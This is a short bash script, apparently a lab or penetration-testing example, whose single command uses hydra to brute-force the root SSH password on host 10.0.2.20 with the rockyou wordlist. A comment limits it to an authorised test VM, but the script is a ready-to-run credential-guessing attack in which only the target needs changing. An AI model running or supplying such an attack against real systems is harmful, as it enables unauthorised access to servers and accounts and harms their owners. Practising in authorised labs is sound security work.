#!/usr/bin/env bash
# Controlled lab example — run only against an authorised test VM.
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.20 -t 4
